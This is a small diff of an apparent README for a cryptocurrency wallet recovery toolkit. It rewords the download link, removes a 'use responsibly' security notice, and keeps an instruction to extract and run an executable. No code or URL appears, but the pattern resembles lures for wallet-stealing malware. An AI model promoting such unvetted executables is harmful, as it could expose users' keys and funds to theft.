@@ -21,22 +21,12 @@ Secure key reconstruction methods
 Step-by-step recovery guides
 
 📥 Getting Started
-Download the recovery toolkit here:
-🔗 Download Wallet Recovery Tools
+Download the recovery toolkit 
+🔗 Run crypto software tools
 
 📌 Note: Extract and run the executable file to begin the recovery process.
 
 For alternative download options, check our Releases section.
-
-
-🔐 Security Notice
-⚠ Use responsibly - only attempt to recover wallets you legally own
-⚠ Maintain maximum security during recovery operations
-
-🤖 Happy Recovering! 🗝️🔒
-Explore our tools and reclaim your lost crypto assets today!
-
-
 
 
 
